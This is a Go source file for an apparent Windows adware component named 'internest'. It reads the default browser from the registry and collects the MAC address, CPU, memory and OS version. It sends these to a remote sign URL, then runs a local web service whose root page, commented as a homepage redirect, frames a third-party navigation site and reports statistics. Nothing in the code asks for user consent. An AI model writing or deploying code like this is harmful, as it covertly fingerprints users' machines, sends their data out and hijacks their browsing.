package internest

import (
	"encoding/json"
	"errors"
	"fmt"
	"net/url"
	"strconv"
	"syscall"
	"unsafe"

	"github.com/ssoor/webapi"
	"github.com/ssoor/winapi"
	"github.com/ssoor/youniverse/api"
	"github.com/ssoor/youniverse/assistant"
	"github.com/ssoor/youniverse/common"
	"github.com/ssoor/youniverse/log"
)

type responseSign struct {
	Terminal string `json:"terminal"`
}

func getDefaultBrowser() (string, error) {
	var regHKey winapi.HKEY
	if errorCode := winapi.RegOpenKeyEx(winapi.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", 0, winapi.KEY_READ, &regHKey); winapi.ERROR_SUCCESS != errorCode {
		if errorCode := winapi.RegOpenKeyEx(winapi.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice", 0, winapi.KEY_READ, &regHKey); winapi.ERROR_SUCCESS != errorCode {
			return "IE.HTTP", nil // errors.New("open url associations subkey failed")
		}
	}

	var bufSize uint32 = 256
	bufCPUName := make([]uint16, bufSize)

	if errorCode := winapi.RegQueryValueEx(regHKey, "ProgId", 0, nil, &bufCPUName, &bufSize); winapi.ERROR_SUCCESS != errorCode {
		return "", nil
	}

	winapi.RegCloseKey(regHKey)

	return syscall.UTF16ToString(bufCPUName), nil
}

func StartInternest(account string, guid string, setting Settings) (bool, error) {
	url, err := url.Parse(setting.SignURL)
	if nil != err {
		return false, err
	}

	query := url.Query()
	query.Set("account", account)

	log.Info("Internest sign info:")

	mac, err := common.GetConnectMAC("tcp", "www.baidu.com:80")
	if nil != err {
		return false, err
	}
	log.Info("\t", "mac:", mac)

	cpu, err := common.GetCPUString()
	if nil != err {
		return false, err
	}
	log.Info("\t", "cpu:", cpu)

	statex := winapi.MEMORYSTATUSEX{
		Length: uint32(unsafe.Sizeof(winapi.MEMORYSTATUSEX{})),
	}
	if succ := winapi.GlobalMemoryStatusEx(&statex); false == succ {
		return false, errors.New(fmt.Sprint("Query memory stats info failed:", winapi.GetLastError()))
	}
	log.Info("\t", "mem:", strconv.FormatUint(statex.TotalPhys/1024/1024, 10), "MB")

	query.Set("mac", mac)
	query.Set("cpu", cpu)
	query.Set("mem", strconv.FormatUint(statex.TotalPhys/1024/1024, 10))

	browser, err := getDefaultBrowser()
	if nil != err {
		return false, err
	}
	log.Info("\t", "browser:", browser)

	osVersion := winapi.GetVersion()
	buildVersion := 0
	majorVersion := int(osVersion & 0xFF)
	minorVersion := int(osVersion & 0xFF00 >> 8)
	if osVersion < 0x80000000 {
		buildVersion = int(winapi.HIWORD(uint32(osVersion)))
	}
	log.Info("\t", "version:", fmt.Sprintf("Windows %d.%d(%d)", majorVersion, minorVersion, buildVersion))

	query.Set("browser", browser)
	query.Set("os", fmt.Sprintf("Windows %d.%d(%d)", majorVersion, minorVersion, buildVersion))

	url.RawQuery = query.Encode()

	jsonSign, err := api.GetURL(url.String())
	if err != nil {
		return false, errors.New(fmt.Sprint("Query internest sign ", url, " failed."))
	}

	response := responseSign{}
	if err = json.Unmarshal([]byte(jsonSign), &response); err != nil {
		return false, errors.New("Unmarshal internest sign interface failed.")
	}

	service := webapi.NewByteAPI()

	statsAPI := NewStatsAPI() // 程序运行状态
	service.AddResource(statsAPI, "/stats")

	warrantAPI := NewWarrantAPI(response.Terminal, setting.EnforceURL) // 发送统计
	service.AddResource(warrantAPI, "/warrant")

	urlnestedAPI := NewURLNestedAPI(NestedIFrame, "网址导航，上网从这里开始", "http://www.2345mini.com/") // 主页跳转
	service.AddResource(urlnestedAPI, "/")

	if 0 == setting.APIPort {
		selectPort, err := common.SocketSelectPort("tcp", 80)
		if nil != err {
			return false, err
		}

		setting.APIPort = int(selectPort)
	}

	go service.Start(setting.APIPort)

	handle, err := assistant.SetAPIPort(setting.APIPort)
	log.Info("Setting internest data share handle:", handle, ", err:", err)

	return true, nil
}
